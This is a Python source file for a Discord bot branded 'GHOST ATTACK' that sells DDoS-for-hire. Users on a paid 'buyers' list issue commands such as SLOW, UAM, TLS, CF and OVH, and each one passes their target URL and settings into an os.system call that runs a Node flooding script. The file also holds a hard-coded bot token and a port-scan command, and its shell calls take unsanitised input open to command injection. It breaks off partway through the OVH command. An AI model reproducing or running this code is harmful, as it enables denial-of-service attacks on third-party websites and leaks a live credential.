import discord,time

from discord import File

from ping3 import ping
from discord.utils import escape_mentions
import aiohttp
import asyncio
import random
import datetime
from random import choice
import os, sys, requests, json
from requests import post,Session
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands
from re import search
import socket
import sys
import ipaddress 
import threading
import psutil
token = "MTA3ODI4NzgzMTAwNjQ0OTY3Ng.GIGnP9.YigiszmyLqefn-kxflNhDyDK3XRtqt9o1BhY-M"
buyers = [1034085284490522635, 1026062372693082122, 1077608070324178994]
admins = [1034085284490522635, 1077608070324178994]
ownerList = [1078216307440357376, 1077608070324178994]

prefix = "."
intents = discord.Intents.all()
intents.messages = True
bot = commands.Bot(command_prefix=prefix,help_command=None, intents=intents)
threading = ThreadPoolExecutor(max_workers=int(100000000))
@bot.event
async def on_connect():
    print(f"Connecting Bot : {bot.user}")
    time.sleep(1.0)
    print("Success, Bot Is Online !!!! Owner:ZMN14#0014")
	





#add a buyer to the buyers list.
@bot.command()
async def add_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="Admin-only Command", description="Only Admin Can Use Commands !!!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer in buyers:
        embed = discord.Embed(title="Buyer Error", description=f"{buyer} Is already a buyer!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="Buyer Error", description="Please provide a buyer.", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        buyers.append(buyer)
        embed = discord.Embed(title="Buyer Added", description=f"{buyer} has been added to the Buyer list...", color=0xa30000)
        await ctx.send(embed=embed)

#delete a buyer from the buyers list
@bot.command()
async def del_buyer(ctx, buyer : int = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title="Admin-only Command", description="Only Admin Can Use Commands !!!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer not in buyers:
        embed = discord.Embed(title="Buyer Error", description=f"{buyer} is not a buyer!", color=0xa30000)
        await ctx.send(embed=embed)

    elif buyer is None:
        embed = discord.Embed(title="Buyer Error", description="Please provide a buyer.", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        buyers.remove(buyer)
        embed = discord.Embed(title="Buyer Removed", description=f"{buyer} has been removed from the Buyer list...", color=0xa30000)
        await ctx.send(embed=embed)

#add an admin to the admins list
@bot.command()
async def add_admin(ctx, admin : int = None):
    if ctx.author.id not in ownerList:
        embed = discord.Embed(title="Owner-only Command", description="Only Admin Can Use Commands !!!", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin in admins:
        embed = discord.Embed(title="Administrator Error", description=f"{admin} is already an Admin!", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin is None:
        embed = discord.Embed(title="Administrator Error", description=f"Please provide an Admins ID", color=0xa30000)
        await ctx.send(embed=embed)

    else:
        admins.append(admin)
        embed = discord.Embed(title="Administrator Added", description=f"{admin} has been added to the Admin list...", color=0xa30000)
        await ctx.send(embed=embed)

#delete an admin from the admins list
@bot.command()
async def del_admin(ctx, admin : int = None):
    if ctx.author.id not in ownerList:
        embed = discord.Embed(title="Owner-only Command", description="Only Owner Can Use Commands !!!", color=0xa30000)
        await ctx.send(embed=embed)

    elif admin not in admins:
	    embed = discord.Embed(title="Invalid ID", description="This ID doesn't belong to an existing Admin!", color=0xa30000)
	    await ctx.send(embed=embed)

    elif admin is None:
	    embed = discord.Embed(title="Invalid ID", description="Please provide an ID of a *current* Admin!", color=0xa30000)
	    await ctx.send(embed=embed)

    else:
        admins.remove(admin)
        embed = discord.Embed(title="Administrator Removed", description=f"{admin} has been removed...", color=0xa30000)
        await ctx.send(embed=embed)
        
        
        
        
     
     
     
@bot.command()
async def help(ctx):
	if ctx.author.id not in buyers:
		embeds = discord.Embed(title="🚀 **GHOST DDOS** 🚀", color=0xfcb103)
		embeds.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embeds.set_footer(text=f"© Onwer : VIEET#1686 | {ctx.author.name}")
		
		
		await ctx.reply(embed=embeds)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", description="✨ **HELP MENU ✨", color=discord.Colour.random())
		embed.set_author(name="GHOST ATTACK Bot V1", icon_url="https://media2.giphy.com/media/F2U5dFf4LG1zYmnJS2/giphy.gif")
		embed.add_field(name="**Userinfo**", value="`View User Information`")
		embed.add_field(name="**Botinfo**", value="`View Bot Information`")
		embed.add_field(name="**Portscan**", value="`View Port The server`")
		embed.add_field(name="**Tcping**", value="`View Tcp Ping`")
		embed.add_field(name="**Ping**", value="`Ping Website Status`")
		embed.add_field(name="**Methods**", value="`Show All Methods DDoS`")
		embed.add_field(name="**Commands**",value="`Show All Commands To DDoS`")
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}")
		
		await ctx.send(embed=embed)
	
	
	
	
	
	
@bot.command()
async def Userinfo(ctx, user:discord.Member=None):
	embed = discord.Embed(color=user.color)
	embed.set_author(name=f"User Info - {user}")
	embed.set_thumbnail(url=user.avatar.url)
	embed.add_field(name="ID :", value=user.id)
	embed.add_field(name="Name :", value=user.display_name)
	embed.add_field(name="Created at :", value=user.created_at)
	embed.add_field(name="Joined at :", value=user.joined_at)
	embed.add_field(name="Bot ?", value=user.bot)
	embed.set_footer(text=f"© Owner : MARSS#2962 | Info User : {user}", icon_url=ctx.author.avatar)
	
	await ctx.send(embed=embed)
	
	
@bot.command()
async def vpsinfo(ctx):
	embed = discord.Embed(color=0x03ff28)
	embed.set_thumbnail(url="https://i.pinimg.com/originals/8f/f2/10/8ff210a59c7a8eadc434ec303f7a86f5.jpg")
	embed.set_author(name="Vps Info - GHOST ATTACK")
	embed.add_field(name="Total RAM GB", value=round(psutil.virtual_memory()[0]/2**30, 2))
	embed.add_field(name="RAM Usage %:", value=psutil.virtual_memory()[2])
	embed.add_field(name="CPU Usage %:", value=psutil.cpu_percent(1))
	embed.set_footer(text="© Owner : MARSS#2962 | Info Bot : 🚀 GHOST ATTACK 🚀", icon_url=ctx.author.avatar)
	
	await ctx.send(embed=embed)	
	
	
@bot.command()
async def Botinfo(ctx):
	embed = discord.Embed(color=0x03ff28)
	embed.set_thumbnail(url="https://i.pinimg.com/originals/8f/f2/10/8ff210a59c7a8eadc434ec303f7a86f5.jpg")
	embed.set_author(name="Bot Info - GHOST ATTACK")
	embed.add_field(name="ID :", value="1015483556501409792")
	embed.add_field(name="Name :", value="GHOST ATTACK")
	embed.add_field(name="Bot Owner :", value="MARSS#2962")
	embed.add_field(name="Function :", value="DDoS Attack")
	embed.add_field(name="Bot ?", value="True")
	embed.set_footer(text="© Owner : MARSS#2962 | Info Bot : 🚀 GHOST ATTACK 🚀", icon_url=ctx.author.avatar)
	
	await ctx.send(embed=embed)
	
	
	
@bot.command()
async def Portscan(ctx, ip: str = '1.1.1.1'):
    if not ip:
        await ctx.send('You need to enter a IP address to scan!', delete_after=30)
    else:
        scan = requests.get(f'https://api.hackertarget.com/nmap/?q={ip}').text
        embed = discord.Embed(timestamp=datetime.datetime.utcnow(), color=0xfefefe)
        embed.add_field(name='Port Scan Results:', value=f'{scan}')
        embed.set_footer(text=f"Requested by {ctx.author.name}", icon_url=f'{ctx.author.avatar}')
        await ctx.send(embed=embed)
        
        
@bot.command()
async def Tcping(ctx, *, ip: str = '1.1.1.1:443'):
    headers = {
        'Accept': 'application/json'
    }
    r = requests.get(f'https://check-host.net/check-tcp?host={ip}&max_nodes=15', headers=headers).text
    host = json.loads(r)
    embed = discord.Embed(timestamp=datetime.datetime.utcnow(), title="**TCP Check Host**", color=0xfefefe)
    embed.add_field(name="Link To Report", value=host['permanent_link'], inline=False)
    await ctx.send(embed=embed)
    
    
@bot.command()
async def ping(ctx, address: str) -> None:
        """
        Performs a HTTP request to the specified address
        :param ctx: commands.Context
        :param address: Address to make request to
        :return: HTTP status code
        """
        if not address.startswith("http"):
            address = f"http://{address}"

        address = escape_mentions(address)

        async with aiohttp.ClientSession(
        ) as session:
            try:
                async with session.get(address) as res:
                    await ctx.reply(
                        f"Recieved response code: {res.status} ({res.reason})"
                    )
            except asyncio.TimeoutError:
                await ctx.reply(f"Request timed out after some seconds")
            except aiohttp.ClientError:
                await ctx.reply(f"Could not establish a connection to {address}")

	
	
	
	
	
	
	
	
@bot.command()
async def Methods(ctx):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embet = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embet.add_field(name="**Methods Layer4**", value="```\nOVH-ACK\nOVH-AMP\nOVH-UDP\nHOME```")
		embet.add_field(name="**Methods Layer7**", value="```\nSLOW\nHYPER\nUAM\nUAM-BYPASS\nHTTP-RAW\nTLS\nHTTP-RAND\nHTTP-SOCKETS\nIO-STRESSER\nCLOUDFLARE\nCF-BYPASS\nCF-GLACIER\nDEFAULT-DDOS```")
		embet.set_footer(text=f"© Owner : MARSS#2962 | All Methods Show")
		
		await ctx.channel.send(embed=embet)
	
	
	
	
	
	
	
@bot.command()
async def Commands(ctx):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://media2.giphy.com/media/F2U5dFf4LG1zYmnJS2/giphy.gif")
		embed.add_field(name="**SLOW**", value="```!SLOW [url] [time]```")
		embed.add_field(name="**OVH-ACK**", value="```.OVH-ACK [ip] [port] [threads] [throttle]```")
		embed.add_field(name="**OVH-UDP**", value="```.OVHUDP [ip] [port] [packet_size] [pps_limiter] [threads] [time]```")
		embed.add_field(name="**HOME**", value="```.HOME [host] [port] [duration]```")
		embed.add_field(name="**HYPER**", value="```!HYPER [url] [time]```")
		embed.add_field(name="**UAM**", value="```!UAM [url] [thread] [time] [raw/proxy]```")
		embed.add_field(name="**TLS**", value="```.TLS [url] [time] [rate] [threads]```")
		embed.add_field(name="**UAM-BYPASS**", value="```!UAM_BYPASS [url] [time] [request/id]```")
		embed.add_field(name="**HTTP-RAW**", value="```!HTTP_RAW [url] [time]```")
		embed.add_field(name="**HTTP-RAND**", value="```!HTTP_RAND [url] [time]```")
		embed.add_field(name="**HTTP-SOCKETS**", value="```!HTTP_SOCKETS [url] [request/ip] [time]```")
		embed.add_field(name="**IO-STRESSER**", value="```!IO_STRESSER [url] [time] [thread] [bypass/proxy]```")
		embed.add_field(name="**CLOUDFLARE**", value="```!CF [url] [time] [thread]```")
		embed.add_field(name="**CF-BYPASS**", value="```!CF_BYPASS [url] [thread<50] [time]```")
		embed.add_field(name="**DEFAULT-DDOS**", value="```!DEFAULT [url] [get/post]```")
		embed.set_footer(text="© Owner : MARSS#2962 | All Methods Command", icon_url=ctx.author.avatar)
		
		await ctx.send(embed=embed)
		
		
		
		
		
		
		
@bot.command()
async def SLOW(ctx, url, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`HTTP-BYPASS`")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node slow.js {url} {time}")
		
		
		
		
		
		
		
@bot.command()
async def HYPER(ctx, url, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`HYPER`")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node hyper.js {url} {time}")
		
		
		
		
		
		
@bot.command()
async def UAM(ctx, url, thread, time, mthd):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`UAM`")
		embed.add_field(name="**Threads**", value=f"`{thread}`")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		
		os.system(f"node ll.js {url} {thread} {time} {mthd}")
		
		
		
		
		
@bot.command()
async def TLS(ctx, target, time, Rate, threads):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{target}`")
		embed.add_field(name="**Methods**", value="`TLS`")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		embed.add_field(name="**Rate**", value=f"`{Rate}`")
		embed.add_field(name="**Threads**", value=f"`{threads}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		
		os.system(f"node TLS-V2.js {target} {time} {Rate} {threads}")
		
@bot.command()
async def UAM_BYPASS(ctx, url, time, req):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`UAM-BYPASS`")
		embed.add_field(name="**Requests/ip**", value=f"`{req}")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node uam.js {url} {time} {req} proxies.txt")
		
		
		
@bot.command()
async def HTTP_RAW(ctx, url, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`HTTP-RAW`")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		await ctx.send(embed=embed)
		
		
		os.system(f"node HTTP-RAW.js {url} {time}")
		
		
		
		
@bot.command()
async def HTTP_RAND(ctx, url, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`HTTP-RAND`")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		await ctx.send(embed=embed)
		
		
		os.system(f"node HTTP-RAND.js {url} {time}")
		
		
		
		
@bot.command()
async def HTTP_SOCKETS(ctx, url, req, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`HTTP-SOCKETS`")
		embed.add_field(name="**Requests/ip**", value=f"`{req}`")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node HTTP-SOCKETS.js {url} {req} {time}")
		
		
		
		
@bot.command()
async def IO_STRESSER(ctx, url, time, thread, mthd):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`IO-STRESSER`")
		embed.add_field(name="**Threads**", value=f"`{thread}")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node io-stresser.js {url} {time} {thread} {mthd}")
		
		
		
@bot.command()
async def CF(ctx, url, time, thread):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`CLOUDFLARE`")
		embed.add_field(name="**Threads**", value=f"`{thread}")
		embed.add_field(name="**Duration** ", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node cf.js {url} {time} {thread}")
		
		
@bot.command()
async def CF_GLACIER(ctx, method, target, proxy, time, requestip, threads):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Methods**", value=f"`{method}`")
		embed.add_field(name="**Url**", value=f"`{target}`")
		embed.add_field(name="**Proxy**", value=f"`{proxy}")
		embed.add_field(name="**Duration** ", value=f"`{time}`")
		embed.add_field(name="**Request Per IP** ", value=f"`{requestip}`")
		embed.add_field(name="**Threads** ", value=f"`{threads}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node CF-GLACIER.js {method} {target} {proxy} {time} {requestip} {threads}")
		
		
@bot.command()
async def OVH(ctx, url, port, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Url**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`OVH`")
		embed.add_field(name="**Port**", value=f"`{port}`")
		embed.add_field(name="**Duration** ", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
